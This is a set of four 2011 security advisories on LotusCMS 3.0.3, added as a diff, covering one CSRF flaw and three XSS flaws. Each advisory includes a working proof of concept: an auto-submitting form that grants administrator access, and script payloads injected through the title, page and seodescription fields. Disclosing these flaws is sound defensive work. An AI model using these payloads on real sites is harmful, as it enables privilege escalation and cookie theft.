@@ -1,0 +1,97 @@
+Vulnerability ID: HTB22886
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_lotuscms.html
+Product: LotusCMS
+Vendor: Arboroia Network ( http://www.lotuscms.org/ ) 
+Vulnerable Version: 3.0.3 and probably prior versions
+Vendor Notification: 01 March 2011 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "core/model/UsersModel.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/index.php?system=Users&page=edit&active=USERNAME" method="post" name="main">
+<input type="hidden" name="name" value="test">
+<input type="hidden" name="email" value="email (at) example (dot) com [email concealed]">
+<input type="hidden" name="password1" value="">
+<input type="hidden" name="password2" value="">
+<input type="hidden" name="access" value="administrator">
+</form>
+<script>
+document.main.submit();
+</script>
+
+Vulnerability ID: HTB22887
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_lotuscms_3.html
+Product: LotusCMS
+Vendor: Arboroia Network ( http://www.lotuscms.org/ ) 
+Vulnerable Version: 3.0.3 and probably prior versions
+Vendor Notification: 01 March 2011 
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "modules/Menu/MenuModuleAdmin.php" script to properly sanitize user-supplied input in "title" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/index.php?system=Modules&page=admin&active=Menu&req=
+save&id=3" method="post" name="main">
+<input type="hidden" name="title" value='lotus"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="external" value="http://host">
+</form>
+<script>
+document.main.submit();
+</script>
+
+Vulnerability ID: HTB22885
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_lotuscms_2.html
+Product: LotusCMS
+Vendor: Arboroia Network ( http://www.lotuscms.org/ ) 
+Vulnerable Version: 3.0.3 and probably prior versions
+Vendor Notification: 01 March 2011 
+Vulnerability Type: XSS (Cross Site Scripting)
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "core/model/PageModel.php" script to properly sanitize user-supplied input in "page" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+http://host/index.php?page=%00"><script>alert(document.cookie)</script>
+
+Vulnerability ID: HTB22884
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_lotuscms_1.html
+Product: LotusCMS
+Vendor: Arboroia Network ( http://www.lotuscms.org/ ) 
+Vulnerable Version: 3.0.3 and probably prior versions
+Vendor Notification: 01 March 2011 
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "core/model/SEOModel.php" script to properly sanitize user-supplied input in "seodescription" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/index.php?system=SEO&page=edit" method="post" name="main">
+<input type="hidden" name="seokeywords" value="LotusCMS">
+<input type="hidden" name="seodescription" value='description"><script>alert(document.cookie)</script>'>
+</form>
+<script>
+document.main.submit();
+</script>
